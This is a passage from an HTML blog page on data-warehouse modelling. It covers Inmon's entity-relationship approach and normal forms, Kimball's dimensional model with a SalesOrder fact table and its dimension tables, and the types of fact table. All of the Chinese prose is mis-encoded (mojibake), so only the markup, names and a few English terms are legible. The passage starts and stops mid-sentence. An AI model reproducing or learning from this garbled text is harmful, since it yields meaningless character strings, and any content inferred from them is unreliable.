æƒ¯æœ‰å¾ˆå¥½çš„æ–‡ä»¶å¤¹ç»„ç»‡æ–¹å¼ï¼Œè€Œä¸æ˜¯ç³Ÿç³•æ··ä¹±çš„æ¡Œé¢ï¼Œç»å¸¸ä¸ºæ‰¾ä¸€ä¸ªæ–‡ä»¶è€Œä¸çŸ¥æ‰€æªã€‚</p><p>æ•°æ®æ¨¡å‹å°±æ˜¯æ•°æ®ç»„ç»‡å’Œå­˜å‚¨æ–¹æ³•ï¼Œå®ƒå¼ºè°ƒä»ä¸šåŠ¡ã€æ•°æ®å­˜å–å’Œä½¿ç”¨è§’åº¦åˆç†å­˜å‚¨æ•°æ®ã€‚åªæœ‰å°†æ•°æ®æœ‰åºçš„ç»„ç»‡å’Œå­˜å‚¨èµ·æ¥ä¹‹åï¼Œæ•°æ®æ‰èƒ½å¾—åˆ°é«˜æ€§èƒ½ã€ä½æˆæœ¬ã€é«˜æ•ˆç‡ã€é«˜è´¨é‡çš„ä½¿ç”¨ã€‚</p><p>é«˜æ€§èƒ½ï¼šè‰¯å¥½çš„æ•°æ®æ¨¡å‹èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬å¿«é€ŸæŸ¥è¯¢æ‰€éœ€è¦çš„æ•°æ®ã€‚</p><p>ä½æˆæœ¬ï¼šè‰¯å¥½çš„æ•°æ®æ¨¡å‹èƒ½å‡å°‘é‡å¤è®¡ç®—ï¼Œå®ç°è®¡ç®—ç»“æœçš„å¤ç”¨ï¼Œé™ä½è®¡ç®—æˆæœ¬ã€‚</p><p>é«˜æ•ˆç‡ï¼šè‰¯å¥½çš„æ•°æ®æ¨¡å‹èƒ½æå¤§çš„æ”¹å–„ç”¨æˆ·ä½¿ç”¨æ•°æ®çš„ä½“éªŒï¼Œæé«˜ä½¿ç”¨æ•°æ®çš„æ•ˆç‡ã€‚</p><p>é«˜è´¨é‡ï¼šè‰¯å¥½çš„æ•°æ®æ¨¡å‹èƒ½æ”¹å–„æ•°æ®ç»Ÿè®¡å£å¾„çš„æ··ä¹±ï¼Œå‡å°‘è®¡ç®—é”™è¯¯çš„å¯èƒ½æ€§ã€‚</p><h3 id="æ•°æ®ä»“åº“å»ºæ¨¡æ–¹æ³•è®º"><a href="#æ•°æ®ä»“åº“å»ºæ¨¡æ–¹æ³•è®º" class="headerlink" title="æ•°æ®ä»“åº“å»ºæ¨¡æ–¹æ³•è®º"></a>æ•°æ®ä»“åº“å»ºæ¨¡æ–¹æ³•è®º</h3><h4 id="ERæ¨¡å‹"><a href="#ERæ¨¡å‹" class="headerlink" title="ERæ¨¡å‹"></a>ERæ¨¡å‹</h4><p>æ•°æ®ä»“åº“ä¹‹çˆ¶Bill Inmonæå‡ºçš„å»ºæ¨¡æ–¹æ³•æ˜¯ä»å…¨ä¼ä¸šçš„é«˜åº¦ï¼Œç”¨å®ä½“å…³ç³»ï¼ˆEntity<br>Relationshipï¼ŒERï¼‰æ¨¡å‹æ¥æè¿°ä¼ä¸šä¸šåŠ¡ï¼Œå¹¶ç”¨è§„èŒƒåŒ–çš„æ–¹å¼è¡¨ç¤ºå‡ºæ¥ï¼Œåœ¨èŒƒå¼ç†è®ºä¸Šç¬¦åˆ3NFã€‚</p><p><strong>1ï¼‰å®ä½“å…³ç³»æ¨¡å‹</strong></p><p>å®ä½“å…³ç³»æ¨¡å‹å°†å¤æ‚çš„æ•°æ®æŠ½è±¡ä¸ºä¸¤ä¸ªæ¦‚å¿µâ€”â€”å®ä½“å’Œå…³ç³»ã€‚å®ä½“è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡ï¼Œä¾‹å¦‚å­¦ç”Ÿã€ç­çº§ï¼Œå…³ç³»æ˜¯æŒ‡ä¸¤ä¸ªå®ä½“ä¹‹é—´çš„å…³ç³»ï¼Œä¾‹å¦‚å­¦ç”Ÿå’Œç­çº§ä¹‹é—´çš„ä»å±å…³ç³»ã€‚</p><p><strong>2ï¼‰æ•°æ®åº“è§„èŒƒåŒ–</strong></p><p>æ•°æ®åº“è§„èŒƒåŒ–æ˜¯ä½¿ç”¨ä¸€ç³»åˆ—èŒƒå¼è®¾è®¡æ•°æ®åº“ï¼ˆé€šå¸¸æ˜¯å…³ç³»å‹æ•°æ®åº“ï¼‰çš„è¿‡ç¨‹ï¼Œå…¶ç›®çš„æ˜¯å‡å°‘æ•°æ®å†—ä½™ï¼Œå¢å¼ºæ•°æ®çš„ä¸€è‡´æ€§ã€‚</p><p>è¿™ä¸€ç³»åˆ—èŒƒå¼å°±æ˜¯æŒ‡åœ¨è®¾è®¡å…³ç³»å‹æ•°æ®åº“æ—¶ï¼Œéœ€è¦éµä»çš„ä¸åŒçš„è§„èŒƒã€‚å…³ç³»å‹æ•°æ®åº“çš„èŒƒå¼ä¸€å…±æœ‰å…­ç§ï¼Œåˆ†åˆ«æ˜¯ç¬¬ä¸€èŒƒå¼ï¼ˆ1NFï¼‰ã€ç¬¬äºŒèŒƒå¼ï¼ˆ2NFï¼‰ã€ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰ã€å·´æ–¯-ç§‘å¾·èŒƒå¼ï¼ˆBCNFï¼‰ã€ç¬¬å››èŒƒå¼(4NFï¼‰å’Œç¬¬äº”èŒƒå¼ï¼ˆ5NFï¼‰ã€‚éµå¾ªçš„èŒƒå¼çº§åˆ«è¶Šé«˜ï¼Œæ•°æ®å†—ä½™æ€§å°±è¶Šä½ã€‚</p><p><strong>3ï¼‰ä¸‰èŒƒå¼</strong></p><p><strong>ï¼ˆ1ï¼‰å‡½æ•°ä¾èµ–</strong></p><p><strong>ï¼ˆ2ï¼‰ç¬¬ä¸€èŒƒå¼</strong></p><p><strong>ï¼ˆ3ï¼‰ç¬¬äºŒèŒƒå¼</strong></p><p><strong>ï¼ˆ4ï¼‰ç¬¬ä¸‰èŒƒå¼</strong></p><p>ä¸‹å›¾ä¸ºä¸€ä¸ªé‡‡ç”¨Bill<br>Inmonå€¡å¯¼çš„å»ºæ¨¡æ–¹æ³•æ„å»ºçš„æ¨¡å‹ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¾ƒä¸ºæ¾æ•£ã€é›¶ç¢ï¼Œç‰©ç†è¡¨æ•°é‡å¤šã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/250b56b4e3e1198e1f6df4cfadcf3651.png"></p><p>è¿™ç§å»ºæ¨¡æ–¹æ³•çš„å‡ºå‘ç‚¹æ˜¯æ•´åˆæ•°æ®ï¼Œå…¶ç›®çš„æ˜¯å°†æ•´ä¸ªä¼ä¸šçš„æ•°æ®è¿›è¡Œç»„åˆå’Œåˆå¹¶ï¼Œå¹¶è¿›è¡Œè§„èŒƒå¤„ç†ï¼Œå‡å°‘æ•°æ®å†—ä½™æ€§ï¼Œä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚è¿™ç§æ¨¡å‹å¹¶ä¸é€‚åˆç›´æ¥ç”¨äºåˆ†æç»Ÿè®¡ã€‚</p><h4 id="ç»´åº¦æ¨¡å‹"><a href="#ç»´åº¦æ¨¡å‹" class="headerlink" title="ç»´åº¦æ¨¡å‹"></a>ç»´åº¦æ¨¡å‹</h4><p>æ•°æ®ä»“åº“é¢†åŸŸçš„ä»¤ä¸€ä½å¤§å¸ˆâ€”â€”Ralph<br>Kimballå€¡å¯¼çš„å»ºæ¨¡æ–¹æ³•ä¸ºç»´åº¦å»ºæ¨¡ã€‚ç»´åº¦æ¨¡å‹å°†å¤æ‚çš„ä¸šåŠ¡é€šè¿‡äº‹å®å’Œç»´åº¦ä¸¤ä¸ªæ¦‚å¿µè¿›è¡Œå‘ˆç°ã€‚äº‹å®é€šå¸¸å¯¹åº”ä¸šåŠ¡è¿‡ç¨‹ï¼Œè€Œç»´åº¦é€šå¸¸å¯¹åº”ä¸šåŠ¡è¿‡ç¨‹å‘ç”Ÿæ—¶æ‰€å¤„çš„ç¯å¢ƒã€‚</p><p><strong>æ³¨</strong>ï¼šä¸šåŠ¡è¿‡ç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä¸€ä¸ªä¸ªä¸å¯æ‹†åˆ†çš„è¡Œä¸ºäº‹ä»¶ï¼Œä¾‹å¦‚ç”µå•†äº¤æ˜“ä¸­çš„ä¸‹å•ï¼Œå–æ¶ˆè®¢å•ï¼Œä»˜æ¬¾ï¼Œé€€å•ç­‰ï¼Œéƒ½æ˜¯ä¸šåŠ¡è¿‡ç¨‹ã€‚</p><p>ä¸‹å›¾ä¸ºä¸€ä¸ªå…¸å‹çš„ç»´åº¦æ¨¡å‹ï¼Œå…¶ä¸­ä½äºä¸­å¿ƒçš„SalesOrderä¸ºäº‹å®è¡¨ï¼Œå…¶ä¸­ä¿å­˜çš„æ˜¯ä¸‹å•è¿™ä¸ªä¸šåŠ¡è¿‡ç¨‹çš„æ‰€æœ‰è®°å½•ã€‚ä½äºå‘¨å›´æ¯å¼ è¡¨éƒ½æ˜¯ç»´åº¦è¡¨ï¼ŒåŒ…æ‹¬Dateï¼ˆæ—¥æœŸï¼‰ï¼ŒCustomerï¼ˆé¡¾å®¢ï¼‰ï¼ŒProductï¼ˆäº§å“ï¼‰ï¼ŒLocationï¼ˆåœ°åŒºï¼‰ç­‰ï¼Œè¿™äº›ç»´åº¦è¡¨å°±ç»„æˆäº†æ¯ä¸ªè®¢å•å‘ç”Ÿæ—¶æ‰€å¤„çš„ç¯å¢ƒï¼Œå³ä½•äººã€ä½•æ—¶ã€åœ¨ä½•åœ°ä¸‹å•äº†ä½•ç§äº§å“ã€‚ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ¨¡å‹ç›¸å¯¹æ¸…æ™°ã€ç®€æ´ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/d48645420eb5979f3550dc6589449f50.png" alt="å›¾ç¤º æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>ç»´åº¦å»ºæ¨¡ä»¥æ•°æ®åˆ†æä½œä¸ºå‡ºå‘ç‚¹ï¼Œä¸ºæ•°æ®åˆ†ææœåŠ¡ï¼Œå› æ­¤å®ƒå…³æ³¨çš„é‡ç‚¹çš„ç”¨æˆ·å¦‚ä½•æ›´å¿«çš„å®Œæˆéœ€æ±‚åˆ†æä»¥åŠå¦‚ä½•å®ç°è¾ƒå¥½çš„å¤§è§„æ¨¡å¤æ‚æŸ¥è¯¢çš„å“åº”æ€§èƒ½ã€‚</p><h2 id="ç¬¬3ç« -ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹äº‹å®è¡¨"><a href="#ç¬¬3ç« -ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹äº‹å®è¡¨" class="headerlink" title="ç¬¬3ç«  ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹äº‹å®è¡¨"></a>ç¬¬3ç«  ç»´åº¦å»ºæ¨¡ç†è®ºä¹‹äº‹å®è¡¨</h2><h3 id="äº‹å®è¡¨æ¦‚è¿°"><a href="#äº‹å®è¡¨æ¦‚è¿°" class="headerlink" title="äº‹å®è¡¨æ¦‚è¿°"></a>äº‹å®è¡¨æ¦‚è¿°</h3><p>äº‹å®è¡¨ä½œä¸ºæ•°æ®ä»“åº“ç»´åº¦å»ºæ¨¡çš„æ ¸å¿ƒï¼Œç´§ç´§å›´ç»•ç€ä¸šåŠ¡è¿‡ç¨‹æ¥è®¾è®¡ã€‚å…¶åŒ…å«ä¸è¯¥ä¸šåŠ¡è¿‡ç¨‹æœ‰å…³çš„ç»´åº¦å¼•ç”¨ï¼ˆç»´åº¦è¡¨å¤–é”®ï¼‰ä»¥åŠè¯¥ä¸šåŠ¡è¿‡ç¨‹çš„åº¦é‡ï¼ˆé€šå¸¸æ˜¯å¯ç´¯åŠ çš„æ•°å­—ç±»å‹å­—æ®µï¼‰ã€‚</p><h4 id="äº‹å®è¡¨ç‰¹ç‚¹"><a href="#äº‹å®è¡¨ç‰¹ç‚¹" class="headerlink" title="äº‹å®è¡¨ç‰¹ç‚¹"></a>äº‹å®è¡¨ç‰¹ç‚¹</h4><p>äº‹å®è¡¨é€šå¸¸æ¯”è¾ƒâ€œç»†é•¿â€ï¼Œå³åˆ—è¾ƒå°‘ï¼Œä½†è¡Œè¾ƒå¤šï¼Œä¸”è¡Œçš„å¢é€Ÿå¿«ã€‚</p><h4 id="äº‹å®è¡¨åˆ†ç±»"><a href="#äº‹å®è¡¨åˆ†ç±»" class="headerlink" title="äº‹å®è¡¨åˆ†ç±»"></a>äº‹å®è¡¨åˆ†ç±»</h4><p>äº‹å®è¡¨æœ‰ä¸‰ç§ç±»å‹ï¼šåˆ†åˆ«æ˜¯äº‹åŠ¡äº‹å®è¡¨ã€å‘¨æœŸå¿«ç…§äº‹å®è¡¨å’Œç´¯ç§¯å¿«ç…§äº‹å®è¡¨ï¼Œæ¯ç§äº‹å®è¡¨éƒ½å…·æœ‰ä¸åŒçš„ç‰¹ç‚¹å’Œé€‚ç”¨åœºæ™¯ï¼Œä¸‹é¢é€ä¸ªä»‹ç»ã€‚</p><h3 id="äº‹åŠ¡å‹äº‹å®è¡¨"><a href="#äº‹åŠ¡å‹äº‹å®è¡¨" class="headerlink" title="äº‹åŠ¡å‹äº‹å®è¡¨"></a>äº‹åŠ¡å‹äº‹å®è¡¨</h3><h4 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>äº‹åŠ¡äº‹å®è¡¨ç”¨æ¥è®°å½•å„ä¸šåŠ¡è¿‡ç¨‹ï¼Œå®ƒä¿å­˜çš„æ˜¯å„ä¸šåŠ¡è¿‡ç¨‹çš„åŸå­æ“ä½œäº‹ä»¶ï¼Œå³æœ€ç»†ç²’åº¦çš„æ“ä½œäº‹ä»¶ã€‚ç²’åº¦æ˜¯æŒ‡äº‹å®è¡¨ä¸­ä¸€è¡Œæ•°æ®æ‰€è¡¨è¾¾çš„ä¸šåŠ¡ç»†èŠ‚ç¨‹åº¦ã€‚</p><p>äº‹åŠ¡å‹äº‹å®è¡¨å¯ç”¨äºåˆ†æä¸å„ä¸šåŠ¡è¿‡ç¨‹ç›¸å…³çš„å„é¡¹ç»Ÿè®¡æŒ‡æ ‡ï¼Œç”±äºå…¶ä¿å­˜äº†æœ€ç»†ç²’åº¦çš„è®°å½•ï¼Œå¯ä»¥æä¾›æœ€å¤§é™åº¦çš„çµæ´»æ€§ï¼Œå¯ä»¥æ”¯æŒæ— æ³•é¢„æœŸçš„å„ç§ç»†èŠ‚å±‚æ¬¡çš„ç»Ÿè®¡éœ€æ±‚ã€‚</p><h4 id="è®¾è®¡æµç¨‹"><a href="#è®¾è®¡æµç¨‹" class="headerlink" title="è®¾è®¡æµç¨‹"></a>è®¾è®¡æµç¨‹</h4><p>è®¾è®¡äº‹åŠ¡äº‹å®è¡¨æ—¶ä¸€èˆ¬å¯éµå¾ªä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><p><strong>é€‰æ‹©ä¸šåŠ¡è¿‡ç¨‹â†’å£°æ˜ç²’åº¦â†’ç¡®è®¤ç»´åº¦â†’ç¡®è®¤äº‹å®</strong></p><p><strong>1ï¼‰é€‰æ‹©ä¸šåŠ¡è¿‡ç¨‹</strong></p><p>åœ¨ä¸šåŠ¡ç³»ç»Ÿä¸­ï¼ŒæŒ‘é€‰æˆ‘ä»¬æ„Ÿå…´è¶£çš„ä¸šåŠ¡è¿‡ç¨‹ï¼Œä¸šåŠ¡è¿‡ç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä¸€ä¸ªä¸ªä¸å¯æ‹†åˆ†çš„è¡Œä¸ºäº‹ä»¶ï¼Œä¾‹å¦‚ç”µå•†äº¤æ˜“ä¸­çš„ä¸‹å•ï¼Œå–æ¶ˆè®¢å•ï¼Œä»˜æ¬¾ï¼Œé€€å•ç­‰ï¼Œéƒ½æ˜¯ä¸šåŠ¡è¿‡ç¨‹ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªä¸šåŠ¡è¿‡ç¨‹å¯¹åº”ä¸€å¼ äº‹åŠ¡å‹äº‹å®è¡¨ã€‚</p><p><strong>2ï¼‰å£°æ˜ç²’åº¦</strong></p><p>ä¸šåŠ¡è¿‡ç¨‹ç¡®å®šåï¼Œéœ€è¦ä¸ºæ¯ä¸ªä¸šåŠ¡è¿‡ç¨‹å£°æ˜ç²’åº¦ã€‚å³ç²¾ç¡®å®šä¹‰æ¯å¼ äº‹åŠ¡å‹äº‹å®è¡¨çš„æ¯è¡Œæ•°æ®è¡¨ç¤ºä»€ä¹ˆï¼Œåº”è¯¥å°½å¯èƒ½é€‰æ‹©æœ€ç»†ç²’åº¦ï¼Œä»¥æ­¤æ¥åº”å„ç§ç»†èŠ‚ç¨‹åº¦çš„éœ€æ±‚ã€‚</p><p><strong>å…¸å‹çš„ç²’åº¦å£°æ˜å¦‚ä¸‹ï¼š</strong></p><p>è®¢å•äº‹å®è¡¨ä¸­ä¸€è¡Œæ•°æ®è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªè®¢å•ä¸­çš„ä¸€ä¸ªå•†å“é¡¹ã€‚</p><p><strong>3ï¼‰ç¡®å®šç»´åº¦</strong></p><p>ç¡®å®šç»´åº¦å…·ä½“æ˜¯æŒ‡ï¼Œç¡®å®šä¸æ¯å¼ äº‹åŠ¡å‹äº‹å®è¡¨ç›¸å…³çš„ç»´åº¦æœ‰å“ªäº›ã€‚</p><p>ç¡®å®šç»´åº¦æ—¶åº”å°½é‡å¤šçš„é€‰æ‹©ä¸ä¸šåŠ¡è¿‡ç¨‹ç›¸å…³çš„ç¯å¢ƒä¿¡æ¯ã€‚å› ä¸ºç»´åº¦çš„ä¸°å¯Œç¨‹åº¦å°±å†³å®šäº†ç»´åº¦æ¨¡å‹èƒ½å¤Ÿæ”¯æŒçš„æŒ‡æ ‡ä¸°å¯Œç¨‹åº¦ã€‚</p><p><strong>4ï¼‰ç¡®å®šäº‹å®</strong></p><p>æ­¤å¤„çš„â€œäº‹å®â€ä¸€è¯ï¼ŒæŒ‡çš„æ˜¯æ¯ä¸ªä¸šåŠ¡è¿‡ç¨‹çš„åº¦é‡å€¼ï¼ˆé€šå¸¸æ˜¯å¯ç´¯åŠ çš„æ•°å­—ç±»å‹çš„å€¼ï¼Œä¾‹å¦‚ï¼šæ¬¡æ•°ã€ä¸ªæ•°ã€ä»¶æ•°ã€é‡‘é¢ç­‰ï¼‰ã€‚</p><p>ç»è¿‡ä¸Šè¿°å››ä¸ªæ­¥éª¤ï¼Œäº‹åŠ¡å‹äº‹å®è¡¨å°±åŸºæœ¬è®¾è®¡å®Œæˆäº†ã€‚ç¬¬ä¸€æ­¥é€‰æ‹©ä¸šåŠ¡è¿‡ç¨‹å¯ä»¥ç¡®å®šæœ‰å“ªäº›äº‹åŠ¡å‹äº‹å®è¡¨ï¼Œç¬¬äºŒæ­¥å¯ä»¥ç¡®å®šæ¯å¼ äº‹åŠ¡å‹äº‹å®è¡¨çš„æ¯è¡Œæ•°æ®æ˜¯ä»€ä¹ˆï¼Œç¬¬ä¸‰æ­¥å¯ä»¥ç¡®å®šæ¯å¼ äº‹åŠ¡å‹äº‹å®è¡¨çš„ç»´åº¦å¤–é”®ï¼Œç¬¬å››æ­¥å¯ä»¥ç¡®å®šæ¯å¼ äº‹åŠ¡å‹äº‹å®è¡¨çš„åº¦é‡å€¼å­—æ®µã€‚</p><h4 id="ä¸è¶³"><a href="#ä¸è¶³" class="headerlink" title="ä¸è¶³"></a>ä¸è¶³</h4><p>äº‹åŠ¡å‹äº‹å®è¡¨å¯ä»¥ä¿å­˜æ‰€æœ‰ä¸šåŠ¡è¿‡ç¨‹çš„æœ€ç»†ç²’åº¦çš„æ“ä½œäº‹ä»¶ï¼Œæ•…ç†è®ºä¸Šå…¶å¯ä»¥æ”¯æ’‘ä¸å„ä¸šåŠ¡è¿‡ç¨‹ç›¸å…³çš„å„ç§ç»Ÿè®¡ç²’åº¦çš„éœ€æ±‚ã€‚ä½†å¯¹äºæŸäº›ç‰¹å®šç±»å‹çš„éœ€æ±‚ï¼Œå…¶é€»è¾‘å¯èƒ½ä¼šæ¯”è¾ƒå¤æ‚ï¼Œæˆ–è€…æ•ˆç‡ä¼šæ¯”è¾ƒä½ä¸‹ã€‚ä¾‹å¦‚ï¼š</p><p><strong>1ï¼‰å­˜é‡å‹æŒ‡æ ‡</strong></p><p>ä¾‹å¦‚å•†å“åº“å­˜ï¼Œè´¦æˆ·ä½™é¢ç­‰ã€‚æ­¤å¤„ä»¥ç”µå•†ä¸­çš„è™šæ‹Ÿè´§å¸ä¸ºä¾‹ï¼Œè™šæ‹Ÿè´§å¸ä¸šåŠ¡åŒ…å«çš„ä¸šåŠ¡è¿‡ç¨‹ä¸»è¦åŒ…æ‹¬è·å–è´§å¸å’Œä½¿ç”¨è´§å¸ï¼Œä¸¤ä¸ªä¸šåŠ¡è¿‡ç¨‹å„è‡ªå¯¹åº”ä¸€å¼ äº‹åŠ¡å‹äº‹å®è¡¨ï¼Œä¸€å¼ å­˜å‚¨æ‰€æœ‰çš„è·å–è´§å¸çš„åŸå­æ“ä½œäº‹ä»¶ï¼Œå¦ä¸€å¼ å­˜å‚¨æ‰€æœ‰ä½¿ç”¨è´§å¸çš„åŸå­æ“ä½œäº‹ä»¶ã€‚</p><p>å‡å®šç°æœ‰ä¸€ä¸ªéœ€æ±‚ï¼Œè¦æ±‚ç»Ÿè®¡æˆªè‡³å½“æ—¥çš„å„ç”¨æˆ·è™šæ‹Ÿè´§å¸ä½™é¢ã€‚ç”±äºè·å–è´§å¸å’Œä½¿ç”¨è´§å¸å‡ä¼šå½±å“åˆ°ä½™é¢ï¼Œæ•…éœ€è¦å¯¹ä¸¤å¼ äº‹åŠ¡å‹äº‹å®è¡¨è¿›è¡Œèšåˆï¼Œä¸”éœ€è¦åŒºåˆ†ä¸¤è€…å¯¹ä½™é¢çš„å½±å“ï¼ˆåŠ æˆ–å‡ï¼‰ï¼Œå¦å¤–éœ€è¦å¯¹ä¸¤å¼ è¡¨çš„å…¨è¡¨æ•°æ®èšåˆæ‰èƒ½å¾—åˆ°ç»Ÿè®¡ç»“æœã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸è®ºæ˜¯ä»é€»è¾‘ä¸Šè¿˜æ˜¯æ•ˆç‡ä¸Šè€ƒè™‘ï¼Œè¿™éƒ½ä¸æ˜¯ä¸€ä¸ªå¥½çš„æ–¹æ¡ˆã€‚</p><p><strong>2ï¼‰å¤šäº‹åŠ¡å…³è”ç»Ÿè®¡</strong></p><p>ä¾‹å¦‚ï¼Œç°éœ€è¦ç»Ÿè®¡æœ€è¿‘30å¤©ï¼Œç”¨æˆ·ä¸‹å•åˆ°æ”¯ä»˜çš„æ—¶é—´é—´éš”çš„å¹³å‡å€¼ã€‚ç»Ÿè®¡æ€è·¯åº”è¯¥æ˜¯æ‰¾åˆ°ä¸‹å•äº‹åŠ¡äº‹å®è¡¨å’Œæ”¯ä»˜äº‹åŠ¡äº‹å®è¡¨ï¼Œè¿‡æ»¤å‡ºæœ€è¿‘30å¤©çš„è®°å½•ï¼Œç„¶åæŒ‰ç…§è®¢å•idå¯¹ä¸¤å¼ äº‹å®è¡¨è¿›è¡Œå…³è”ï¼Œä¹‹åç”¨æ”¯ä»˜æ—¶é—´å‡å»ä¸‹å•æ—¶é—´ï¼Œç„¶åå†æ±‚å¹³å‡å€¼ã€‚</p><p>é€»è¾‘ä¸Šè™½ç„¶å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯å…¶æ•ˆç‡è¾ƒä½ï¼Œåº”ä¸ºä¸‹å•äº‹åŠ¡äº‹å®è¡¨å’Œæ”¯ä»˜äº‹åŠ¡äº‹å®è¡¨å‡ä¸ºå¤§è¡¨ï¼Œå¤§è¡¨joinå¤§è¡¨çš„æ“ä½œåº”å°½é‡é¿å…ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¸Šè¿°ä¸¤ç§åœºæ™¯ä¸‹äº‹åŠ¡å‹äº‹å®è¡¨çš„è¡¨ç°å¹¶ä¸ç†æƒ³ã€‚ä¸‹é¢è¦ä»‹ç»çš„å¦å¤–ä¸¤ç§ç±»å‹çš„äº‹å®è¡¨å°±æ˜¯ä¸ºäº†å¼¥è¡¥äº‹åŠ¡å‹äº‹å®è¡¨çš„ä¸è¶³çš„ã€‚</p><h3 id="å‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨"><a href="#å‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨" class="headerlink" title="å‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨"></a>å‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨</h3><h4 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>å‘¨æœŸå¿«ç…§äº‹å®è¡¨ä»¥å…·æœ‰è§„å¾‹æ€§çš„ã€å¯é¢„è§çš„æ—¶é—´é—´éš”æ¥è®°å½•äº‹å®ï¼Œä¸»è¦ç”¨äºåˆ†æä¸€äº›å­˜é‡å‹ï¼ˆä¾‹å¦‚å•†å“åº“å­˜ï¼Œè´¦æˆ·ä½™é¢ï¼‰æˆ–è€…çŠ¶æ€å‹ï¼ˆç©ºæ°”æ¸©åº¦ï¼Œè¡Œé©¶é€Ÿåº¦ï¼‰æŒ‡æ ‡ã€‚</p><p>å¯¹äºå•†å“åº“å­˜ã€è´¦æˆ·ä½™é¢è¿™äº›å­˜é‡å‹æŒ‡æ ‡ï¼Œä¸šåŠ¡ç³»ç»Ÿä¸­é€šå¸¸å°±ä¼šè®¡ç®—å¹¶ä¿å­˜æœ€æ–°ç»“æœï¼Œæ‰€ä»¥å®šæœŸåŒæ­¥ä¸€ä»½å…¨é‡æ•°æ®åˆ°æ•°æ®ä»“åº“ï¼Œæ„å»ºå‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨ï¼Œå°±èƒ½è½»æ¾åº”å¯¹æ­¤ç±»ç»Ÿè®¡éœ€æ±‚ï¼Œè€Œæ— éœ€å†å¯¹äº‹åŠ¡å‹äº‹å®è¡¨ä¸­å¤§é‡çš„å†å²è®°å½•è¿›è¡Œèšåˆäº†ã€‚</p><p>å¯¹äºç©ºæ°”æ¸©åº¦ã€è¡Œé©¶é€Ÿåº¦è¿™äº›çŠ¶æ€å‹æŒ‡æ ‡ï¼Œç”±äºå®ƒä»¬çš„å€¼å¾€å¾€æ˜¯è¿ç»­çš„ï¼Œæˆ‘ä»¬æ— æ³•æ•è·å…¶å˜åŠ¨çš„åŸå­äº‹åŠ¡æ“ä½œï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨äº‹åŠ¡å‹äº‹å®è¡¨ç»Ÿè®¡æ­¤ç±»éœ€æ±‚ã€‚è€Œåªèƒ½å®šæœŸå¯¹å…¶è¿›è¡Œé‡‡æ ·ï¼Œæ„å»ºå‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨ã€‚</p><h4 id="è®¾è®¡æµç¨‹-1"><a href="#è®¾è®¡æµç¨‹-1" class="headerlink" title="è®¾è®¡æµç¨‹"></a>è®¾è®¡æµç¨‹</h4><p><strong>1ï¼‰ç¡®å®šç²’åº¦</strong></p><p>å‘¨æœŸå‹å¿«ç…§äº‹å®è¡¨çš„ç²’åº¦å¯ç”±é‡‡æ ·å‘¨æœŸå’Œç»´åº¦æè¿°ï¼Œæ•…ç¡®å®šé‡‡æ ·å‘¨æœŸå’Œç»´åº¦åå³å¯ç¡®å®šç²’åº¦ã€‚</p><p>é‡‡æ ·å‘¨æœŸé€šå¸¸é€‰æ‹©æ¯æ—¥ã€‚</p><p>ç»´åº¦å¯æ ¹æ®ç»Ÿè®¡æŒ‡æ ‡å†³å®šï¼Œä¾‹å¦‚æŒ‡æ ‡ä¸ºç»Ÿè®¡æ¯ä¸ªä»“åº“ä¸­æ¯ç§å•†å“çš„åº“å­˜ï¼Œåˆ™å¯ç¡®å®šç»´åº¦ä¸ºä»“åº“å’Œå•†å“ã€‚</p><p>ç¡®å®šå®Œé‡‡æ ·å‘¨æœŸå’Œç»´åº¦åï¼Œå³å¯ç¡®å®šè¯¥è¡¨ç²’åº¦ä¸ºæ¯æ—¥-ä»“åº“-å•†å“ã€‚</p><p><strong>2ï¼‰ç¡®è®¤äº‹å®</strong></p><p>äº‹å®ä¹Ÿå¯æ ¹æ®ç»Ÿè®¡æŒ‡æ ‡å†³å®šï¼Œä¾‹å¦‚æŒ‡æ ‡ä¸ºç»Ÿè®¡æ¯ä¸ªä»“åº“ä¸­æ¯ç§å•†å“çš„åº“å­˜ï¼Œåˆ™äº‹å®ä¸ºå•†å“åº“å­˜ã€‚</p><h4 id="äº‹å®ç±»å‹"><a href="#äº‹å®ç±»å‹" class="headerlink" title="äº‹å®ç±»å‹"></a>äº‹å®ç±»å‹</h4><p>æ­¤å¤„çš„äº‹å®ç±»å‹æ˜¯æŒ‡åº¦é‡å€¼çš„ç±»å‹ï¼Œè€Œéäº‹å®è¡¨çš„ç±»å‹ã€‚äº‹å®ï¼ˆåº¦é‡å€¼ï¼‰å…±åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯å¯åŠ äº‹å®ï¼ŒåŠå¯åŠ äº‹å®å’Œä¸å¯åŠ äº‹å®ã€‚</p><p><strong>1ï¼‰å¯åŠ äº‹å®</strong></p><p>å¯åŠ 